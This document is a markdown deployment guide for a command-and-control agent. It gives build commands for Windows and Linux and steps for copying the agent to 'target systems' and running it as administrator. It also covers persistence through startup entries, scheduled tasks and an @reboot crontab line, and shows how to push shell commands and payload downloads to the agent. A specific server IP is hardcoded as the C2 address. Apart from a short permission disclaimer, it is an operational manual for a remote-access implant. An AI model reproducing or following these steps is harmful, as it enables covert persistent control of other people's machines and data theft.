# Quick Deployment Guide

## Prerequisites

1. **C2 Server Running**: Ensure your C2 server is running on `http://150.136.130.59:3002`
2. **Database Ready**: MySQL database with C2 tables should be initialized
3. **Network Access**: Target systems need network access to the C2 server

## Step 1: Test C2 Server Integration

```bash
# Test the C2 endpoints
node test_c2_agent.js
```

This will verify that:
- Server is reachable
- Agent registration works
- Command retrieval works
- Result submission works

## Step 2: Build the Agent

### Windows
```batch
# Run the build script
build_agent.bat

# Or manually with Visual Studio
cl /EHsc /std:c++17 C2Agent.cpp /link ws2_32.lib iphlpapi.lib wininet.lib /out:C2Agent.exe
```

### Linux
```bash
# Install dependencies
sudo apt-get update
sudo apt-get install build-essential libcurl4-openssl-dev libjsoncpp-dev

# Build the agent
chmod +x build_agent_linux.sh
./build_agent_linux.sh
```

## Step 3: Deploy Agent

### Windows Deployment
1. Copy `C2Agent.exe` to target system
2. Run as administrator: `C2Agent.exe`
3. For persistence, add to startup or create scheduled task

### Linux Deployment
1. Copy `C2Agent` to target system
2. Make executable: `chmod +x C2Agent`
3. Run: `./C2Agent`
4. For persistence, add to crontab: `@reboot /path/to/C2Agent`

## Step 4: Monitor in Dashboard

1. Access your admin dashboard
2. Navigate to the "C2" tab
3. You should see the agent appear in the agents list
4. The agent will show as "active" with system information

## Step 5: Send Commands

1. Select an agent from the list
2. Choose command type (shell or download)
3. Enter command data
4. Click "Send Command"
5. Monitor results in the "Results" tab

## Example Commands

### Shell Commands
- Windows: `dir`, `whoami`, `systeminfo`
- Linux: `ls -la`, `whoami`, `uname -a`

### Download Commands
- `http://example.com/payload.exe`
- `https://github.com/user/repo/releases/download/v1.0/tool.exe`

## Troubleshooting

### Agent Not Appearing
- Check C2 server URL in agent configuration
- Verify network connectivity
- Check firewall settings
- Review server logs

### Commands Not Executing
- Verify agent is registered and active
- Check command syntax
- Review result logs for errors
- Ensure agent has proper permissions

### Build Issues
- Install required development packages
- Check compiler version compatibility
- Verify library dependencies

## Security Notes

⚠️ **Important Security Considerations**:

1. **Use HTTPS**: Configure the agent to use HTTPS for encrypted communication
2. **Authentication**: Consider adding authentication headers to agent requests
3. **Network Isolation**: Deploy in isolated network environments
4. **Monitoring**: Monitor agent behavior and network traffic
5. **Legal Compliance**: Only deploy on systems you own or have permission to test

## Configuration Options

### Agent Configuration
Edit these constants in the agent source code:

```cpp
const char* C2_SERVER = "http://150.136.130.59:3002";
const int HEARTBEAT_INTERVAL = 30000;      // 30 seconds
const int COMMAND_CHECK_INTERVAL = 5000;   // 5 seconds
```

### Server Configuration
The agent works with your existing C2 server configuration. No additional server setup required.

## Next Steps

1. **Test in Lab Environment**: Deploy and test in a controlled environment first
2. **Customize Commands**: Add custom command types as needed
3. **Enhance Security**: Implement additional security measures
4. **Scale Deployment**: Deploy to multiple targets as needed
5. **Monitor Performance**: Track agent performance and optimize as needed

## Support

For issues and questions:
1. Check the troubleshooting section
2. Review the comprehensive README
3. Test in a controlled environment
4. Ensure proper network configuration 